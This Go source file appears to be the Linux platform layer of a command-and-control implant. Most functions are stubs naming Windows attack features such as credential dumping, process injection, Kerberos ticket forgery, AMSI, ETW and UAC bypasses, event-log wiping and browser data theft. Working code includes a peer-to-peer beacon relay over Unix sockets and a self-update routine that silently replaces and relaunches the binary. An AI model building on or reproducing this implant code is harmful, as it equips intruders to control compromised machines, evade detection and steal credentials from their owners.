//go:build linux
// +build linux

package main

import (
	"encoding/binary"
	"fmt"
	"image"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
)

// Linux platform stubs. Screenshot / advanced features can be extended later
// (e.g. via X11 or wayland pure-Go, but that adds complexity/deps; start minimal).

func setDPIAware() {
	// noop on Linux
}

func captureScreenRGBA() (*image.RGBA, error) {
	return nil, fmt.Errorf("screenshot not supported on Linux agent yet")
}

// applyHideWindow is a no-op on Linux (only meaningful on Windows)
func applyHideWindow(cmd *exec.Cmd) {
	// nothing
}

// addPersistenceWindows is never called on linux, but provide for interface completeness
func addPersistenceWindows() {}

// Linux persistence stub (already handled in addPersistence via Debug log)
func addPersistenceLinux() {
	if Debug {
		fmt.Printf("[*] Linux persistence stub (crontab/.bashrc/.config/autostart can be added)\n")
	}
}

// getActiveWindowTitle returns the active window title when xdotool is available.
func getActiveWindowTitle() string {
	out, err := exec.Command("xdotool", "getactivewindow", "getwindowname").Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

// getPlatformSecurityInfo returns (integrity level, isElevated, domain) for Linux.
func getPlatformSecurityInfo() (string, bool, string) {
	elevated := os.Geteuid() == 0
	integrity := "Medium"
	if elevated {
		integrity = "High"
	}
	domain, _ := os.Hostname()
	return integrity, elevated, domain
}

func keyloggerLoop() {
	if Debug {
		fmt.Println("[*] Keylogger not supported on Linux agent (requires input device access)")
	}
	// immediately stop so it doesn't hang
	keylogActive = false
}

func suspendProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("suspend only supported on Windows Go agent")
}

func resumeProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("resume only supported on Windows Go agent")
}

func killProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("killproc only supported on Windows Go agent")
}

func clipboardGetWindows() (string, error) {
	return "", fmt.Errorf("clipboard only on Windows")
}

func clipboardSetWindows(data string) error {
	return fmt.Errorf("clipboard only on Windows")
}

func regGetWindows(key string) (string, error) {
	return "", fmt.Errorf("registry only on Windows")
}

func regSetWindows(path, data string) error {
	return fmt.Errorf("registry only on Windows")
}

func regDeleteWindows(key string) error {
	return fmt.Errorf("registry only on Windows")
}

// --- Stubs for new high-value features (1,3,4,6) ---

func dumpCreds() (string, error) {
	return "", fmt.Errorf("creds dumping only supported on Windows Go agent (EXE)")
}

func injectProcess(pid uint32, shellcode []byte, tech string) error {
	return fmt.Errorf("process injection only supported on Windows Go agent")
}

func lateralMove(spec string) (string, error) {
	return "", fmt.Errorf("lateral movement only supported on Windows Go agent")
}

func spawnProcess(targetExe string, shellcode []byte, technique string) string {
	return "not supported on Linux"
}

func startSocksServer(addr string) {
	// Linux stub: could implement with net.Listen but limited for demo
	go func() {
		ln, err := net.Listen("tcp", addr)
		if err != nil {
			return
		}
		for {
			c, err := ln.Accept()
			if err != nil {
				continue
			}
			c.Close()
		}
	}()
}

// tokenInfoResult — shared struct for token ops (defined here for Linux stubs)
type tokenInfoResult struct {
	PID         uint32
	ProcessName string
	Domain      string
	Username    string
	Integrity   string
	TokenType   string
	Error       string
}

// executeBOF is a Linux stub (runtime.GOOS check prevents calling it)
func executeBOF(bofData []byte, args string) (string, error) {
	return "", fmt.Errorf("BOF is Windows-only")
}

// token ops stubs (runtime.GOOS check prevents calling on Linux)
func tokenListProcesses() ([]tokenInfoResult, error) {
	return nil, fmt.Errorf("token ops are Windows-only")
}
func tokenSteal(pid uint32) (string, string, string, error) {
	return "", "", "", fmt.Errorf("token ops are Windows-only")
}
func getCurrentTokenUser() string {
	return ""
}
func tokenMake(domainUser, password, logonTypeStr string) (string, string, string, error) {
	return "", "", "", fmt.Errorf("token ops are Windows-only")
}
func tokenRevert() error {
	return fmt.Errorf("token ops are Windows-only")
}

func sendP2PSMBBeacon(body []byte) []byte {
	pipeName := strings.TrimPrefix(P2PParent, "pipe://")
	pipePath := fmt.Sprintf("/tmp/%s", pipeName)
	conn, err := net.Dial("unix", pipePath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB pipe dial to %s failed: %v\n", pipePath, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

func p2pListenSMB() {
	pipePath := fmt.Sprintf("/tmp/%s", P2PListenAddr)
	os.Remove(pipePath) // clean up stale socket
	ln, err := net.Listen("unix", pipePath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB listen on %s failed: %v\n", pipePath, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}

// --- Linux stubs for P0 features ---

func peloaderReflective(b64Data string) (string, error) {
	return "", fmt.Errorf("reflective DLL loader is Windows-only")
}

func executeAssemblyForkRun(b64Data string) (string, error) {
	return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
}

func rportfwdCollectOutbound() []socksFrame { return nil }
func rportfwdHandleFrames(frames []socksFrame) {}
func rportfwdDial(connID uint64, target string) {}
func rportfwdWrite(connID uint64, data []byte) {}
func rportfwdClose(connID uint64) {}

func kerberosDCSync(user string) (string, error) {
	return "", fmt.Errorf("DCSync is Windows-only")
}
func kerberosGoldenTicket(user, domain, sid, krbtgtHash string) (string, error) {
	return "", fmt.Errorf("golden ticket is Windows-only")
}
func kerberosSilverTicket(user, domain, sid, target, rc4Hash string) (string, error) {
	return "", fmt.Errorf("silver ticket is Windows-only")
}
func kerberosASREPRoast() (string, error) {
	return "", fmt.Errorf("ASREP roast is Windows-only")
}
func kerberosPassTheHash(user, domain, ntlmHash, target string) (string, error) {
	return "", fmt.Errorf("pass-the-hash is Windows-only")
}
func kerberosPassTheTicket(ticketB64 string) (string, error) {
	return "", fmt.Errorf("pass-the-ticket is Windows-only")
}

func powerPick(script string) string {
	return "not supported on Linux"
}

func stealBrowserData(browser string) string {
	return "browser data theft is Windows-only"
}

func applyPersistence(method string, args string) string {
	return "not supported on Linux"
}

func listPersistence() string {
	return "not supported on Linux"
}

func removePersistence(method string, args string) string {
	return "not supported on Linux"
}

func uacBypass(method, payload string) string {
	return "not supported on Linux"
}

func executeNetCommand(cmd string) string {
	return "net command suite is Windows-only"
}

func amsiBypass() string {
	return "not supported on Linux"
}
func amsiSessionBypass() string {
	return "not supported on Linux"
}

func etwBypass() string {
	return "not supported on Linux"
}
func etwNtTraceEvent() string {
	return "not supported on Linux"
}

func blockDLLs() string {
	return "not supported on Linux"
}

func unhookNtdll() string {
	return "not supported on Linux"
}

func protectProcess() string {
	return "not supported on Linux"
}

func selfDelete() string {
	return "not supported on Linux"
}

func wipeEventLog() string {
	return "not supported on Linux"
}

func wipeTracks() string {
	return "not supported on Linux"
}

func selfUpdateWindows(exe, tmpPath string) string {
	return ""
}

func lateralWMI(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralWinRM(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralPsexec(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralDCOM(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralSCF(targetShare string) (string, error) {
	return "", fmt.Errorf("SCF hash capture is Windows-only")
}
func netScanSMB(cidr string) (string, error) {
	return "", fmt.Errorf("SMB scanning is Windows-only")
}
func netEnumHosts(domain string) (string, error) {
	return "", fmt.Errorf("host enumeration is Windows-only")
}
func netScanSMBDiscovery() (string, error) {
	return "", fmt.Errorf("SMB discovery is Windows-only")
}

func dpapiMasterKey() (string, error) {
	return "", fmt.Errorf("DPAPI is Windows-only")
}
func dpapiBlob(filePath string) (string, error) {
	return "", fmt.Errorf("DPAPI is Windows-only")
}
func dpapiBrowser() (string, error) {
	return "", fmt.Errorf("DPAPI browser decryption is Windows-only")
}
func lsaBypass() (string, error) {
	return "", fmt.Errorf("LSA bypass is Windows-only")
}
func adcsFind() (string, error) {
	return "", fmt.Errorf("AD CS enumeration is Windows-only")
}
func adcsRequest(template string) (string, error) {
	return "", fmt.Errorf("AD CS certificate request is Windows-only")
}
func shadowCreds(target string) (string, error) {
	return "", fmt.Errorf("Shadow Credentials is Windows-only")
}
func ldapQuery(filter string) (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}
func ldapUsers() (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}
func ldapGroups() (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}
func ldapComputers() (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}
func ldapSPN() (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}
func ldapACL() (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}

func selfUpdateLinux(exe, tmpPath string) string {
	shScript := fmt.Sprintf(
		"#!/bin/sh\nsleep 1\ncp -f '%s' '%s'\nchmod +x '%s'\nexec '%s'\n",
		tmpPath, exe, exe, exe)
	tmpScript := exe + ".update.sh"
	if err := os.WriteFile(tmpScript, []byte(shScript), 0755); err != nil {
		return "failed to write update script: " + err.Error()
	}

	cmd := exec.Command("/bin/sh", "-c", "nohup '"+tmpScript+"' >/dev/null 2>&1 &")
	if err := cmd.Start(); err != nil {
		return "failed to start updater: " + err.Error()
	}

	return "self-update: new binary downloaded, replacing and restarting..."
}
